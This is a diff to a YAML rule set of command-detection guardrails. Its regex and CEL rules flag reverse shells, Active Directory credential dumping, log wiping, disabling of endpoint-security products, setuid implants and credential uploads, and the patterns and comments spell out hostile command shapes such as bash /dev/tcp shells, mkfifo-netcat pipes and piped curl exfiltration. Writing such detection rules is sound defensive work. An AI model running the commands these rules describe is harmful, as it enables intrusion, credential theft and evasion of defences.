@@ -1,6 +1,13 @@
 version: 1
 category: command
 rules:
+  - id: CMD-REVSHELL-POWERSHELL-TCP
+    tool_call_only: true
+    pattern: '(?is)\bNew-Object\s+(?:System\.)?Net\.Sockets\.TCPClient\s*\([^)\r\n]{1,512}\)\s*;.{0,1000}\.GetStream\s*\(\s*\)\s*;.{0,1000}\.Read\s*\([^)\r\n]{1,512}\).{0,1000}\b(?:iex|Invoke-Expression)\b.{0,1000}\.Write\s*\('
+    title: "PowerShell TCP command-execution loop"
+    severity: CRITICAL
+    confidence: 0.99
+    tags: [reverse-shell, execution, network]
   - id: CMD-REVSHELL-BASH
     expression: >-
       f.commands.exists(c, c.program in ['nc', 'nc.exe', 'ncat', 'ncat.exe', 'netcat', 'socat'] &&
@@ -10,23 +17,17 @@ rules:
       p.access == defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_EXECUTE) &&
       f.network.exists(n, n.command_id == c.id &&
       n.action in [defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_CONNECT,
-      defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_LISTEN] &&
-      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
-      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]))
+      defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_LISTEN]))
     pattern: '(?i)bash\s+-i\s+>&\s*/dev/tcp/'
     title: "Bash reverse shell"
     severity: CRITICAL
     confidence: 0.98
     tags: [execution, reverse-shell]
   - id: CMD-REVSHELL-DEVTCP
-    # Closes bash /dev/tcp also accepts hostnames
-    # (e.g. exec 5<>/dev/tcp/attacker.example/4444), so match either
-    # a dotted-quad IPv4 prefix OR a non-empty hostname-shaped token
-    # followed by `/<port>`. The hostname branch demands at least one
-    # `.` to keep precision (single-label local names like `host` are
-    # rare on real reverse-shell targets and would create FPs against
-    # benign /dev/tcp/<service> string fragments).
-    pattern: '/dev/tcp/(?:\d{1,3}\.\d{1,3}|[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+)/\d+\b'
+    # Candidate selection requires an interactive shell. A standalone
+    # bidirectional descriptor such as `exec 5<>/dev/tcp/host/443` is also a
+    # legitimate health probe and is not a reverse-shell proof by itself.
+    pattern: '(?i)\b(?:bash|sh|dash|ksh|zsh)\b[^\r\n]{0,192}(?:-[A-Za-z]*i[A-Za-z]*|--interactive)\b[^\r\n]{0,512}/dev/tcp/(?:\d{1,3}\.\d{1,3}|[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+)/\d+\b'
     title: "Reverse shell via /dev/tcp"
     severity: CRITICAL
     confidence: 0.95
@@ -39,7 +40,7 @@ rules:
     # CRITICAL rule. The `-e|--exec` branch on either side is the
     # hard signal — netcat is rarely combined with -e/--exec for
     # legitimate operations.
-    pattern: '(?i)\b(?:nc|ncat|netcat)\b\s+(?:(?:-[a-zA-Z]*\s+)*\S+\s+\d+\s*(?:-e|--exec)\b|(?:-[a-zA-Z]*\s+)*(?:-e|--exec)\s+\S+\s+\S+\s+\d+\b)'
+    pattern: '(?i)(?:\b(?:nc|ncat|netcat)\b\s+(?:(?:-[a-zA-Z]*\s+)*\S+\s+\d+\s*(?:-e|--exec)\b|(?:-[a-zA-Z]*\s+)*(?:-e|--exec)\s+\S+\s+\S+\s+\d+\b)|\bmkfifo\b[^;\r\n]{1,256};[^|\r\n]{1,512}\|\s*(?:nc|ncat|netcat)\b[^;\r\n]{1,256}>\s*/(?:tmp|var/tmp|dev/shm)/)'
     title: "Netcat reverse shell with -e"
     severity: CRITICAL
     confidence: 0.95
@@ -132,7 +133,7 @@ rules:
       p.flavor == defenseclaw.guardrail.semantic.v1.PathFlavor.PATH_FLAVOR_DEVICE))
     pattern: '(?i)(?:^|[;&|\r\n]\s*)(?:sudo\s+)?(?:mkfs(?:\.(?:ext2|ext3|ext4|xfs|btrfs|f2fs|vfat|ntfs|exfat|minix))?|mke2fs|mkdosfs|mkntfs|mkswap|mkexfatfs)(?:\s|$)'
     title: "Filesystem format command"
-    severity: CRITICAL
+    severity: HIGH
     confidence: 0.90
     tags: [destructive]
   - id: CMD-DEVICE-WIPE
@@ -154,6 +155,16 @@ rules:
     severity: CRITICAL
     confidence: 0.90
     tags: [destructive]
+  - id: impact.credential_file_secure_delete
+    tool_call_only: true
+    # Cheap routing predicate only. The code-owned semantic prerequisite proves
+    # exact --remove semantics and a non-fixture credential-file target.
+    expression: "f.commands.exists(c, c.program == 'shred')"
+    pattern: 'a^'
+    title: "Secure deletion of a credential file"
+    severity: HIGH
+    confidence: 0.99
+    tags: [impact, destructive, credential, bounded-grammar]
   - id: CMD-DD-IF
     expression: >-
       f.commands.exists(c, c.argv_complete && c.program == 'dd' &&
@@ -191,8 +202,8 @@ rules:
     confidence: 0.50
     tags: [privilege]
   - id: CMD-ETC-WRITE
-    pattern: '(?i)>\s*/etc/'
-    title: "Write redirect to /etc/"
+    pattern: 'a^'
+    title: "Generic write redirect to /etc/ (strict telemetry only)"
     severity: CRITICAL
     confidence: 0.90
     tags: [system-file]
@@ -242,6 +253,47 @@ rules:
     severity: HIGH
     confidence: 0.99
     tags: [credential, windows, credential-dumping]
+  - id: credential.windows_ntds_ifm_dump
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(c, c.argv_complete && c.program in ['ntdsutil', 'ntdsutil.exe'] &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in c.operations &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_WRITE in c.operations)
+    pattern: '(?i)\bntdsutil(?:\.exe)?\s+"?(?:ac i|activate instance) ntds"?\s+"?ifm"?\s+"?create full [A-Z]:\\[^"\r\n]+"?\s+q\s+q(?:\s|$)'
+    title: "Export the full Active Directory database with NTDS IFM"
+    severity: HIGH
+    confidence: 0.99
+    tags: [credential, active-directory, windows, credential-dumping]
+  - id: credential.directory_credential_acquisition
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(c, c.argv_complete &&
+      c.program in ['impacket-secretsdump', 'secretsdump.py',
+      'impacket-getuserspns', 'getuserspns.py',
+      'impacket-getnpusers', 'getnpusers.py', 'hashcat', 'hashcat.exe', 'john', 'john.exe',
+      'nxc', 'netexec', 'crackmapexec'] &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in c.operations)
+    pattern: '(?i)\b(?:impacket-(?:secretsdump|getuserspns|getnpusers)|(?:secretsdump|getuserspns|getnpusers)\.py|hashcat(?:\.exe)?|john(?:\.exe)?\b[^\r\n]*--format(?:=|\s+)krb5(?:tgs|asrep)|(?:nxc|netexec|crackmapexec)\b[^\r\n]*(?:--ntds|-M\s+ntdsutil))\b'
+    title: "Exact directory credential acquisition"
+    severity: HIGH
+    confidence: 0.99
+    tags: [credential, active-directory, credential-dumping, bounded-grammar]
+  - id: credential.structured_directory_acquisition
+    tool_call_only: true
+    expression: "f.tool in ['secretsdump', 'hashcat_crack', 'kerberoast']"
+    pattern: 'a^'
+    title: "Structured directory credential acquisition"
+    severity: HIGH
+    confidence: 0.99
+    tags: [credential, active-directory, credential-dumping, structured-tool, bounded-grammar]
+  - id: persistence.malicious_download_execute_payload
+    tool_call_only: true
+    expression: "f.tool == 'persist'"
+    pattern: '(?is)"method"\s*:\s*"(?:cron|systemd|pam_module|registry_run|scheduled_task|wmi_subscription)".{0,1000}"payload"\s*:\s*".{0,1000}\b(?:powershell(?:\.exe)?|curl|wget|nc|ncat|netcat)\b'
+    title: "Malicious persistence download-and-execute payload"
+    severity: HIGH
+    confidence: 0.99
+    tags: [persistence, execution, download-exec, structured-tool, bounded-grammar]
   - id: impact.windows_delete_all_shadow_copies
     tool_call_only: true
     expression: >-
@@ -267,6 +319,17 @@ rules:
     severity: HIGH
     confidence: 0.99
     tags: [defense-evasion, tampering, windows, logs]
+  - id: tamper.windows_recursive_everyone_full_control
+    tool_call_only: true
+    expression: "f.commands.exists(c, c.program == 'icacls')"
+    # ActionFacts requires one unconditional invocation, /T, Everyone, both
+    # object/container inheritance flags, and the exact full-control right.
+    # The lexical candidate cannot authorize a finding by itself.
+    pattern: '(?i)\bicacls(?:\.exe)?\b'
+    title: "Recursively grant Everyone inheritable full control on Windows"
+    severity: HIGH
+    confidence: 0.99
+    tags: [tampering, privilege, windows, access-control, recursive]
   - id: impact.windows_recovery_disable_pair
     tool_call_only: true
     expression: >-
@@ -373,7 +436,7 @@ rules:
       defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_POLICY_BYPASS in c.operations)
     # Candidate only. The exact owner requires one direct static mutation of
     # one closed ETW, Defender event-channel, or EventLog autologger setting.
-    pattern: '(?i)(?:\breg(?:\.exe)?\s+add\b[^\r\n]*(?:COMPlus_ETWEnabled|ETWEnabled|Microsoft-Windows-Windows Defender[/\\]Operational|Autologger[/\\]EventLog-Application)|\b(?:set|new)-itemproperty\b[^\r\n]*(?:COMPlus_ETWEnabled|ETWEnabled|Microsoft-Windows-Windows Defender[/\\]Operational|Autologger[/\\]EventLog-Application))'
+    pattern: '(?i)(?:\breg(?:\.exe)?\s+add\b[^\r\n]*(?:COMPlus_ETWEnabled|ETWEnabled|Microsoft-Windows-Windows Defender[/\\]Operational|Autologger[/\\]EventLog-Application|Services[/\\]EventLog)|\b(?:set|new)-itemproperty\b[^\r\n]*(?:COMPlus_ETWEnabled|ETWEnabled|Microsoft-Windows-Windows Defender[/\\]Operational|Autologger[/\\]EventLog-Application|Services[/\\]EventLog))'
     title: "Disable exact Windows ETW or event telemetry controls"
     severity: HIGH
     confidence: 0.99
@@ -406,12 +469,12 @@ rules:
   - id: tamper.endpoint_security_product_disable
     tool_call_only: true
     expression: >-
-      f.commands.exists(c, c.argv_complete && c.program in ['systemctl', 'launchctl', 'sysmon', 'sysmon.exe', 'mdatp', 'sc', 'sc.exe'] &&
+      f.commands.exists(c, c.argv_complete && c.program in ['systemctl', 'launchctl', 'sysmon', 'sysmon.exe', 'mdatp', 'sentinelctl', 'sc', 'sc.exe'] &&
       defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CONFIG_CHANGE in c.operations &&
       defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_POLICY_BYPASS in c.operations)
-    # Candidate only. The exact owner accepts six closed source forms and
+    # Candidate only. The exact owner accepts eight closed source forms and
     # rejects generic, dynamic, conditional, wrapped, or augmented operations.
-    pattern: '(?i)(?:\b(?:sudo\s+)?systemctl\s+(?:stop|disable)\s+falcon-sensor\.service\b|\b(?:sudo\s+)?launchctl\s+unload\s+/Library/LaunchDaemons/(?:com\.carbonblack\.(?:daemon|defense\.daemon)|at\.obdev\.littlesnitchd)\.plist\b|\bsysmon(?:\.exe)?\s+-u(?:\s|$)|\b(?:sudo\s+)?mdatp\s+config\s+real-time-protection\s+--value\s+disabled(?:\s|$)|\bsc(?:\.exe)?\s+(?:stop|config|query)\s+WinDefend\b)'
+    pattern: '(?i)(?:\b(?:sudo\s+)?systemctl\s+(?:(?:stop|disable)\s+falcon-sensor\.service|disable\s+--now\s+falcon-sensor(?:\.service)?)\b|\b(?:sudo\s+)?/opt/sentinelone/bin/sentinelctl\s+control\s+disable(?:\s|$)|\b(?:sudo\s+)?launchctl\s+unload\s+/Library/LaunchDaemons/(?:com\.carbonblack\.(?:daemon|defense\.daemon)|at\.obdev\.littlesnitchd)\.plist\b|\bsysmon(?:\.exe)?\s+-u(?:\s|$)|\b(?:sudo\s+)?mdatp\s+config\s+real-time-protection\s+--value\s+disabled(?:\s|$)|\bsc(?:\.exe)?\s+(?:stop|config|query)\s+WinDefend\b)'
     title: "Disable or uninstall an exact endpoint-security product"
     severity: HIGH
     confidence: 0.99
@@ -457,10 +520,63 @@ rules:
     severity: HIGH
     confidence: 0.99
     tags: [execution, database, postgresql, server-side, bounded-lineage]
+  - id: secrets.sql_sensitive_server_file_read
+    tool_call_only: true
+    expression: "f.tool == 'sql_query'"
+    # Exact ActionFacts owner only. It requires a recognized MySQL or
+    # PostgreSQL connection, one literal SELECT statement, an engine-matched
+    # server-side file-read function, and a closed sensitive-path class.
+    pattern: 'a^'
+    title: "Database server read of an exact sensitive host file"
+    severity: HIGH
+    confidence: 0.99
+    tags: [credential, database, mysql, postgresql, server-side, bounded-lineage]
+  - id: impact.sql_destructive_mutation
+    tool_call_only: true
+    expression: >-
+      f.tool == 'sql_query' ||
+      f.commands.exists(c, c.argv_complete &&
+      c.program in ['psql', 'mysql', 'mariadb', 'sqlcmd'])
+    # Exact ActionFacts owner only. This detects a closed unbounded DELETE,
+    # TRUNCATE, DROP SCHEMA, or DROP DATABASE operation. It remains alert-only
+    # because these operations are dual-use without protected-scope policy.
+    pattern: 'a^'
+    title: "Exact destructive SQL mutation"
+    severity: HIGH
+    confidence: 0.99
+    tags: [impact, database, destructive, bounded-lineage]
+  - id: attack.http_sql_injection
+    tool_call_only: true
+    expression: "f.tool == 'http_request'"
+    # Exact ActionFacts owner only. URL and body values remain private; the
+    # finding retains only one closed executable SQL-injection technique.
+    pattern: 'a^'
+    title: "Executable SQL injection in a structured HTTP request"
+    severity: HIGH
+    confidence: 0.99
+    tags: [attack, web, database, sql-injection, bounded-lineage]
+  - id: exec.sqlserver_xp_cmdshell_invoke
+    tool_call_only: true
+    expression: "f.tool == 'sql_query'"
+    # Exact ActionFacts owner only. It accepts one literal xp_cmdshell call
+    # from the closed sql_query schema and emits no SQL or connection values.
+    pattern: 'a^'
+    title: "SQL Server xp_cmdshell operating-system command execution"
+    severity: HIGH
+    confidence: 0.99
+    tags: [execution, database, sql-server, server-side, bounded-lineage]
+  - id: exec.sqlserver_xp_cmdshell_enable
+    tool_call_only: true
+    expression: "f.tool == 'sql_query'"
+    pattern: 'a^'
+    title: "Enable SQL Server xp_cmdshell command execution"
+    severity: HIGH
+    confidence: 0.99
+    tags: [execution, database, sql-server, configuration, bounded-lineage]
   - id: privilege.cloud_iam_administrator_attachment
     tool_call_only: true
     expression: >-
-      f.commands.exists(c, c.argv_complete && c.program == 'aws' &&
+      f.tool == 'aws.cloudtrail_event' || f.commands.exists(c, c.argv_complete && c.program == 'aws' &&
       defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_PERMISSION_CHANGE in c.operations &&
       defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_PRIVILEGE in c.operations)
     # Candidate selection only. The exact owner accepts the closed aws_cli
@@ -472,6 +588,70 @@ rules:
     severity: HIGH
     confidence: 0.99
     tags: [privilege-escalation, cloud, aws, iam, bounded-lineage]
+  - id: privilege.cloud_iam_wildcard_inline_policy
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(c, c.argv_complete && c.program == 'aws' &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_PERMISSION_CHANGE in c.operations &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_PRIVILEGE in c.operations)
+    pattern: 'a^'
+    title: "Grant exact wildcard AWS IAM permissions through an inline policy"
+    severity: HIGH
+    confidence: 0.99
+    tags: [privilege-escalation, cloud, aws, iam, wildcard, bounded-lineage]
+  - id: impact.cloud_s3_data_delete
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(c, c.argv_complete && c.program == 'aws' &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_DELETE in c.operations &&
+      (('s3' in c.argv) || ('s3api' in c.argv)))
+    # Exact ActionFacts owner only. Standard posture alerts only on recursive
+    # prefix/bucket deletion; single-object cleanup is intentionally silent.
+    pattern: 'a^'
+    title: "Recursively delete an exact AWS S3 prefix or bucket"
+    severity: HIGH
+    confidence: 0.99
+    tags: [impact, cloud, aws, s3, destructive, bounded-lineage]
+  - id: defense_evasion.cloud_security_telemetry_disable
+    tool_call_only: true
+    expression: "f.tool == 'aws.cloudtrail_event'"
+    pattern: 'a^'
+    title: "Disable or delete exact AWS security telemetry"
+    severity: HIGH
+    confidence: 0.99
+    tags: [defense-evasion, cloud, aws, audit, bounded-lineage]
+  - id: exfiltration.cloud_external_snapshot_share
+    tool_call_only: true
+    expression: "f.tool == 'aws.cloudtrail_event'"
+    pattern: 'a^'
+    title: "Share an exact AWS snapshot or image with another account"
+    severity: HIGH
+    confidence: 0.99
+    tags: [exfiltration, cloud, aws, snapshot, bounded-lineage]
+  - id: exposure.cloud_worldwide_ssh
+    tool_call_only: true
+    expression: "f.tool == 'aws.cloudtrail_event'"
+    pattern: 'a^'
+    title: "Expose SSH to a worldwide AWS security-group CIDR"
+    severity: HIGH
+    confidence: 0.99
+    tags: [exposure, cloud, aws, network, bounded-lineage]
+  - id: defense_evasion.endpoint_defender_exclusion
+    tool_call_only: true
+    expression: "f.tool == 'windows.event'"
+    pattern: 'a^'
+    title: "Add an exact Microsoft Defender exclusion"
+    severity: HIGH
+    confidence: 0.99
+    tags: [defense-evasion, endpoint, windows, defender, bounded-lineage]
+  - id: defense_evasion.endpoint_defender_logging_disable
+    tool_call_only: true
+    expression: "f.tool == 'windows.event'"
+    pattern: 'a^'
+    title: "Disable an exact Microsoft Defender logger"
+    severity: HIGH
+    confidence: 0.99
+    tags: [defense-evasion, endpoint, windows, defender, logging, bounded-lineage]
   - id: exec.sql_command_udf_create
     tool_call_only: true
     expression: "f.tool in ['sql_query', 'execute_command']"
@@ -482,6 +662,39 @@ rules:
     severity: HIGH
     confidence: 0.99
     tags: [execution, database, mysql, postgresql, udf, bounded-lineage]
+  - id: exec.sqlite_client_shell_escape
+    tool_call_only: true
+    expression: "f.commands.exists(c, c.argv_complete && c.program == 'sqlite3')"
+    # Exact ActionFacts owner requires one direct literal `.shell` meta-command
+    # to /bin/sh or /bin/bash and rejects all additional client commands.
+    pattern: 'a^'
+    title: "SQLite client escaped to a local shell"
+    severity: HIGH
+    confidence: 0.99
+    tags: [execution, database, sqlite, client-escape, bounded-lineage]
+  - id: exec.mysql_client_shell_escape
+    tool_call_only: true
+    expression: "f.commands.exists(c, c.argv_complete && c.program in ['mysql', 'mariadb'])"
+    # Exact ActionFacts owner requires one direct literal `\\!` meta-command
+    # to /bin/sh or /bin/bash under a closed client-option grammar.
+    pattern: 'a^'
+    title: "MySQL client escaped to a local shell"
+    severity: HIGH
+    confidence: 0.99
+    tags: [execution, database, mysql, mariadb, client-escape, bounded-lineage]
+  - id: privilege.kubernetes_cluster_admin_binding
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(c, c.argv_complete && c.program == 'kubectl' &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_PERMISSION_CHANGE in c.operations &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_PRIVILEGE in c.operations)
+    # The structured kubectl adapter and ActionFacts classifier require a
+    # literal service account and the exact cluster-admin role.
+    pattern: 'a^'
+    title: "Grant Kubernetes cluster-admin to an exact service account"
+    severity: HIGH
+    confidence: 0.99
+    tags: [privilege-escalation, kubernetes, rbac, cluster, bounded-lineage]
   - id: privilege.kubernetes_cronjob_privileged_patch
     tool_call_only: true
     expression: "f.tool == 'kubectl'"
@@ -493,6 +706,45 @@ rules:
     severity: HIGH
     confidence: 0.99
     tags: [privilege, kubernetes, cronjob, cluster, bounded-lineage]
+  - id: privilege.kubernetes_privileged_pod_run
+    tool_call_only: true
+    expression: "f.tool == 'kubectl'"
+    # Exact ActionFacts owner accepts only a closed, non-dry-run kubectl run
+    # with a literal image and privileged=true flag or constrained JSON override.
+    pattern: 'a^'
+    title: "Run an exact privileged Kubernetes pod"
+    severity: HIGH
+    confidence: 0.99
+    tags: [privilege, kubernetes, pod, cluster, bounded-lineage]
+  - id: persistence.kubernetes_cronjob_reverse_shell
+    tool_call_only: true
+    expression: "f.tool == 'kubectl'"
+    # Exact ActionFacts owner requires a literal CronJob identity, image, and
+    # schedule plus one static non-local reverse shell after `--`.
+    pattern: 'a^'
+    title: "Create a Kubernetes CronJob with an exact reverse shell"
+    severity: CRITICAL
+    confidence: 0.99
+    tags: [persistence, execution, reverse-shell, kubernetes, cronjob, bounded-grammar]
+  - id: secrets.kubernetes_cluster_wide_enumeration
+    tool_call_only: true
+    expression: "f.tool == 'kubectl'"
+    # Exact ActionFacts owner accepts only a direct, closed kubectl get
+    # secret[s] request with an explicit all-namespaces flag. Authorization
+    # checks, namespaced reads, dynamic values, and compound commands abstain.
+    pattern: 'a^'
+    title: "Enumerate Kubernetes secrets across all namespaces"
+    severity: HIGH
+    confidence: 0.99
+    tags: [credential, discovery, kubernetes, cluster, bounded-lineage]
+  - id: secrets.kubernetes_workload_identity_token_read
+    tool_call_only: true
+    expression: "f.tool == 'kubectl'"
+    pattern: 'a^'
+    title: "Read a Kubernetes workload identity token through pod exec"
+    severity: HIGH
+    confidence: 0.99
+    tags: [credential, kubernetes, workload-identity, bounded-lineage]
   - id: credential.pam_password_capture
     tool_call_only: true
     expression: >-
@@ -524,13 +776,13 @@ rules:
   - id: tamper.linux_security_control_disable
     tool_call_only: true
     expression: >-
-      f.commands.exists(c, c.argv_complete && c.program in ['auditctl', 'setenforce', 'systemctl'] &&
+      f.commands.exists(c, c.argv_complete && c.program in ['auditctl', 'service', 'setenforce', 'systemctl'] &&
       defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CONFIG_CHANGE in c.operations &&
       defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_POLICY_BYPASS in c.operations)
     # Candidate only. The exact owner accepts one direct, unconditional
-    # auditctl -e 0, setenforce 0/Permissive, or a direct stop of one closed
-    # firewall/audit service set. Sudo is accepted only for the systemctl form.
-    pattern: '(?i)(?:^|[;\r\n]\s*)(?:auditctl\s+-e\s+0|setenforce\s+(?:0|permissive)|(?:sudo\s+)?systemctl\s+stop\s+(?:auditd|firewalld|systemd-journald|ufw)(?:\.service)?)(?:\s|$)'
+    # auditctl -e 0, setenforce 0/Permissive, a direct systemctl stop of one
+    # closed firewall/audit service set, or exact legacy service auditd stop.
+    pattern: '(?i)(?:^|[;\r\n]\s*)(?:(?:sudo\s+)?auditctl\s+(?:-e\s+0|-D|-d\s+(?:task|exit|user|exclude|filesystem|io_uring),(?:never|always)\b)|setenforce\s+(?:0|permissive)|(?:sudo\s+)?systemctl\s+stop\s+(?:auditd|firewalld|systemd-journald|ufw)(?:\.service)?|(?:sudo\s+)?service\s+auditd\s+stop)(?:\s|$)'
     title: "Disable a Linux host security control"
     severity: HIGH
     confidence: 0.99
@@ -603,11 +855,49 @@ rules:
       defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_DELETE])
     # Candidate only. The exact owner accepts a closed destructive grammar and
     # rejects reads, append, dynamic paths, application logs, and bounded vacuum.
-    pattern: '(?i)(?:^|[;\r\n]\s*)(?:cat\s+/dev/(?:null|zero)\s*>\s*/var/log/(?:messages|security|syslog|auth\.log|secure|audit/audit\.log)|echo\s+(?:''''|"")\s*>\s*/var/log/(?:messages|security|syslog|auth\.log|secure|audit/audit\.log)|truncate\s+(?:-s\s+0|--size=0)\s+/var/log/(?:messages|security|syslog|auth\.log|secure|audit/audit\.log)|(?:rm\s+-(?:rf|fr)|unlink)\s+/var/log/(?:messages|security|syslog|auth\.log|secure|audit/audit\.log)|(?:sudo\s+)?journalctl\s+--vacuum-time=0)(?:\s|$)'
+    pattern: '(?i)(?:^|[;"\r\n]\s*)(?:cat\s+/dev/(?:null|zero)\s*>\s*/var/log/(?:messages|security|syslog|auth\.log|secure|audit/audit\.log)|echo\s+(?:''''|"")\s*>\s*/var/log/(?:messages|security|syslog|auth\.log|secure|audit/audit\.log)|(?:sudo\s+)?(?:/usr/bin/)?truncate\s+(?:-s\s+0|--size=0)\s+/var/log/(?:(?:messages|security|syslog|secure|audit/audit\.log)|auth\.log(?:/current\.log)?)(?:\s+2>/dev/null)?(?:\s+\|\|\s+true)?|chattr\s+-i\s+/var/log/audit/audit\.log\.1(?:\s+2>/dev/null)?\s*;\s*(?:/usr/bin/)?truncate\s+-s\s+0\s+/var/log/audit/audit\.log\.1|(?:rm\s+-(?:rf|fr)|unlink)\s+/var/log/(?:messages|security|syslog|auth\.log|secure|audit/audit\.log)|(?:sudo\s+)?rm\s+-f\s+/var/log/journal/\*/system\.journal|(?:sudo\s+)?journalctl\s+--vacuum-time=0)(?:\s|"|$)'
     title: "Destroy canonical POSIX system logs"
     severity: HIGH
     confidence: 0.99
     tags: [defense-evasion, tampering, posix, logs]
+  - id: privilege.temporary_setuid_executable
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(c, c.argv_complete && c.program == 'chmod' &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_PERMISSION_CHANGE in c.operations)
+    # Candidate only. The code-owned proof requires one literal numeric setuid
+    # mode with an executable bit and exactly one absolute temporary-file path.
+    pattern: '(?i)\bchmod\s+(?:--\s+)?0?4[0-7]*[1-7][0-7]*\s+/(?:tmp|var/tmp|dev/shm)/\S+'
+    title: "Create a setuid executable in a temporary directory"
+    severity: HIGH
+    confidence: 0.99
+    tags: [privilege, persistence, posix, bounded-grammar]
+  - id: privilege.custom_root_suid_implant
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(c, c.argv_complete && c.program == 'chmod' &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_PERMISSION_CHANGE in c.operations)
+    # Candidate only. The code-owned ActionFacts proof parses a closed heredoc
+    # grammar and requires effective setuid(0)/setresuid(0), exact source/output
+    # lineage, root ownership, and a setuid executable mode on the same output.
+    pattern: '(?is)\b(?:cc|gcc)\s+\S+\.c\s+-o\s+\S+.{0,512}\bchown\s+(?:root:root|0:0)\s+\S+.{0,256}\bchmod\s+0?4[0-7]*[1-7][0-7]*\s+\S+'
+    title: "Compile and install a custom root-setuid executable"
+    severity: CRITICAL
+    confidence: 0.995
+    tags: [privilege, persistence, posix, exact-lineage, bounded-grammar]
+  - id: privilege.pkroot_setuid_shell
+    tool_call_only: true
+    # The code-owned ActionFacts prerequisite proves the complete nested
+    # command. CEL cannot independently authorize this partial-parser case.
+    expression: 'true'
+    # Candidate only. The code-owned proof requires one literal temporary
+    # pkroot/run executable and an exactly quoted, non-expanding --cmd payload
+    # that copies /bin/bash to /tmp/.pksh and chmods that same path to 4755.
+    pattern: '(?i)^\s*/(?:tmp|var/tmp|dev/shm)/[A-Za-z0-9._/-]*pkroot/run\s+--cmd\s+[''"]cp /bin/bash /tmp/\.pksh && chmod 4755 /tmp/\.pksh[''"]\s*$'
+    title: "Create a setuid Bash copy through pkroot"
+    severity: CRITICAL
+    confidence: 0.999
+    tags: [privilege, persistence, posix, exact-lineage, bounded-grammar]
   - id: CMD-WIN-RM-FORCE
     pattern: 'a^'
     title: "PowerShell forced single-file deletion"
@@ -622,10 +912,10 @@ rules:
     tags: [persistence]
   - id: CMD-NETCAT-LISTEN
     pattern: 'a^'
-    title: "Netcat listener"
+    title: "Netcat network-listener exposure"
     severity: HIGH
     confidence: 0.85
-    tags: [network, reverse-shell]
+    tags: [network, listener]
   - id: CMD-CURL-UPLOAD
     expression: 'false'
     pattern: 'a^'
@@ -703,11 +993,31 @@ rules:
       defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]) &&
       f.data_flows.exists(d, d.from_command_id == dst.id &&
       d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_NETWORK))
-    pattern: '(?i)\b(?:cat|type|Get-Content)\b[^|;\n]*(?:\.env|credentials|\.git-credentials|\.netrc|_netrc|\.npmrc|\.pypirc|config\.json|/token)\s*\|\s*(?:curl\b[^;\n]*(?:--data(?:-binary|-raw|-urlencode)?\s+@-|-d\s+@-|(?:--form|-F)\s+[^;\n]*=@-|--upload-file\s+-|-T\s+-)|wget\b[^;\n]*--post-(?:data|file)(?:=|\s+)@?-)'
+    # Permit at most two bounded pipeline transforms between the sensitive read
+    # and upload. Every segment excludes shell control boundaries and command
+    # substitution so the fallback proves one uninterrupted literal pipeline.
+    pattern: '(?i)\b(?:cat|type|Get-Content)\b[^|;&\r\n`$()]*(?:\.env|credentials|secrets?\.ya?ml|\.git-credentials|\.netrc|_netrc|\.npmrc|\.pypirc|config\.json|id_(?:rsa|dsa|ecdsa|ed25519)|/token)\s*\|(?:[^|;&\r\n`$()]{1,400}\|)?(?:[^|;&\r\n`$()]{1,400}\|)?\s*(?:curl\b[^;&\r\n`$()]*(?:--data(?:-binary|-raw|-urlencode)?\s+@-|-d\s+@-|(?:--form|-F)\s+[^;&\r\n`$()]*=@-|--upload-file\s+-|-T\s+-)|wget\b[^;&\r\n`$()]*--post-(?:data|file)(?:=|\s+)@?-)'
     title: "Sensitive read piped to external upload"
     severity: CRITICAL
     confidence: 0.96
     tags: [credential, exfiltration, network]
+  - id: exfil.credential_file_external_upload
+    tool_call_only: true
+    # CEL proves an upload to a non-local literal destination. The semantic
+    # owner additionally requires an exact file-backed curl source in the
+    # closed high-confidence credential-file vocabulary.
+    expression: >-
+      f.commands.exists(c,
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in c.operations &&
+      f.network.exists(n, n.command_id == c.id &&
+      n.action == defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_UPLOAD &&
+      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
+      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]))
+    pattern: 'a^'
+    title: "Credential file uploaded to an external destination"
+    severity: HIGH
+    confidence: 0.99
